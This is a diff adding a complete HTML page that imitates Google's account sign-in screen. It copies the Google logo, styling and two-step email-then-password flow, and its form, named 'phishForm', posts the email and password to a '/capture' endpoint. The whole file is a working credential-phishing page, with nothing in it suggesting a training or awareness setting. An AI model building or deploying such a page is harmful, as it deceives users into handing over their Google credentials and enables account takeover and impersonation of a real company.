@@ -1,0 +1,241 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - Google Accounts</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      body {
+        font-family: "Inter", sans-serif;
+        background-color: #f0f4f8; /* 1. Background Tint */
+        -webkit-font-smoothing: antialiased;
+      }
+
+      .form-container {
+        overflow: hidden;
+        position: relative;
+        min-height: 240px; /* Maintains height during transition */
+      }
+
+      /* 4. Sliding Transitions */
+      .step {
+        transition:
+          transform 0.4s cubic-bezier(0.4, 0, 0.2, 1),
+          opacity 0.3s;
+        width: 100%;
+      }
+
+      .slide-out {
+        transform: translateX(-100%);
+        opacity: 0;
+        position: absolute;
+      }
+
+      .slide-in {
+        transform: translateX(0);
+        opacity: 1;
+      }
+
+      .hidden-right {
+        transform: translateX(100%);
+        opacity: 0;
+        position: absolute;
+      }
+
+      /* Google's specific input focus behavior */
+      input:focus + label {
+        color: #1a73e8 !important;
+      }
+
+      .custom-input:focus {
+        border: 2px solid #1a73e8;
+        padding: 13px 15px; /* Adjusts for border thickness */
+      }
+    </style>
+  </head>
+  <body class="min-h-screen flex items-center justify-center p-4">
+    <div
+      class="w-full max-w-[448px] p-10 bg-white rounded-[28px] shadow-sm border border-[#DEE2E6]"
+    >
+      <div class="text-center mb-8">
+        <svg
+          version="1.1"
+          xmlns="http://www.w3.org/2000/svg"
+          width="48px"
+          height="48px"
+          viewBox="0 0 48 48"
+          class="mx-auto block"
+        >
+          <g>
+            <path
+              fill="#EA4335"
+              d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
+            ></path>
+            <path
+              fill="#4285F4"
+              d="M46.64 24.55c0-1.65-.15-3.23-.42-4.75H24v9.06h12.79c-.55 2.87-2.13 5.3-4.57 6.93l7.98 6.19C44.92 37.1 46.64 31.2 46.64 24.55z"
+            ></path>
+            <path
+              fill="#FBBC05"
+              d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
+            ></path>
+            <path
+              fill="#34A853"
+              d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.98-6.19c-2.21 1.49-5.04 2.38-7.91 2.38-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
+            ></path>
+            <path fill="none" d="M0 0h48v48H0z"></path>
+          </g>
+        </svg>
+        <h1 class="text-[24px] mt-4 font-medium text-gray-900 tracking-tight">
+          Sign in
+        </h1>
+        <p class="text-base mt-2 font-normal text-gray-700">
+          Use your Google Account
+        </p>
+      </div>
+
+      <form action="/capture" method="POST" id="phishForm">
+        <div class="form-container">
+          <div id="emailStep" class="step slide-in">
+            <div class="relative mt-2">
+              <input
+                type="email"
+                id="email"
+                name="u"
+                required
+                class="peer w-full px-4 py-3.5 border border-gray-300 rounded-lg focus:border-blue-600 outline-none text-base text-gray-900 placeholder-transparent transition-all"
+                placeholder="Email or phone"
+              />
+              <label
+                for="email"
+                class="absolute left-4 -top-2.5 text-gray-600 text-xs bg-white px-1 transition-all peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-500 peer-placeholder-shown:top-3.5 peer-focus:-top-2.5 peer-focus:text-xs"
+              >
+                Email or phone
+              </label>
+            </div>
+            <a
+              href="#"
+              class="text-sm font-medium text-blue-600 hover:text-blue-700 mt-3 block"
+              >Forgot email?</a
+            >
+            <div class="text-sm text-gray-600 mt-8">
+              Not your computer? Use Guest mode to sign in privately.
+              <a href="#" class="text-blue-600 font-medium">Learn more</a>
+            </div>
+          </div>
+
+          <div id="passwordStep" class="step hidden-right">
+            <div class="flex justify-center mb-6">
+              <div
+                class="px-3 py-1 bg-white border border-gray-300 rounded-full inline-flex items-center gap-2 text-sm font-medium text-gray-700"
+              >
+                <svg
+                  class="w-4 h-4 text-gray-500"
+                  fill="currentColor"
+                  viewBox="0 0 20 20"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"
+                    clip-rule="evenodd"
+                  ></path>
+                </svg>
+                <span id="displayEmail"></span>
+              </div>
+            </div>
+
+            <div class="relative">
+              <input
+                type="password"
+                id="password"
+                name="p"
+                class="peer w-full px-4 py-3.5 border border-gray-300 rounded-lg focus:border-blue-600 outline-none text-base text-gray-900 placeholder-transparent transition-all"
+                placeholder="Enter your password"
+              />
+              <label
+                for="password"
+                class="absolute left-4 -top-2.5 text-gray-600 text-xs bg-white px-1 transition-all peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-500 peer-placeholder-shown:top-3.5 peer-focus:-top-2.5 peer-focus:text-xs"
+              >
+                Enter your password
+              </label>
+            </div>
+            <div class="flex items-center mt-2">
+              <input
+                type="checkbox"
+                id="showPass"
+                class="w-4 h-4 rounded border-gray-300 text-blue-600"
+              />
+              <label for="showPass" class="ml-2 text-sm text-gray-700"
+                >Show password</label
+              >
+            </div>
+          </div>
+        </div>
+
+        <div class="flex justify-between items-center mt-10">
+          <a
+            href="#"
+            id="createAccountBtn"
+            class="text-sm font-medium text-blue-600 hover:text-blue-700"
+            >Create account</a
+          >
+
+          <button
+            type="button"
+            id="nextBtn"
+            class="px-6 py-2 bg-[#1a73e8] text-white rounded-full font-medium text-sm hover:bg-blue-700 shadow-sm transition duration-150"
+          >
+            Next
+          </button>
+
+          <button
+            type="submit"
+            id="submitBtn"
+            class="hidden px-8 py-2 bg-[#1a73e8] text-white rounded-full font-medium text-sm hover:bg-blue-700 shadow-sm transition"
+          >
+            Sign In
+          </button>
+        </div>
+      </form>
+    </div>
+
+    <script>
+      const nextBtn = document.getElementById("nextBtn");
+      const submitBtn = document.getElementById("submitBtn");
+      const emailStep = document.getElementById("emailStep");
+      const passwordStep = document.getElementById("passwordStep");
+      const emailInput = document.getElementById("email");
+      const passwordInput = document.getElementById("password");
+      const createAccountBtn = document.getElementById("createAccountBtn");
+      const displayEmail = document.getElementById("displayEmail");
+
+      nextBtn.addEventListener("click", () => {
+        if (emailInput.checkValidity()) {
+          displayEmail.textContent = emailInput.value;
+
+          // 4. Slide Animation Logic
+          emailStep.classList.add("slide-out");
+          emailStep.classList.remove("slide-in");
+
+          passwordStep.classList.remove("hidden-right");
+          passwordStep.classList.add("slide-in");
+
+          nextBtn.classList.add("hidden");
+          submitBtn.classList.remove("hidden");
+          createAccountBtn.classList.add("hidden");
+
+          setTimeout(() => {
+            passwordInput.focus();
+          }, 400);
+        } else {
+          emailInput.reportValidity();
+        }
+      });
+    </script>
+  </body>
+</html>
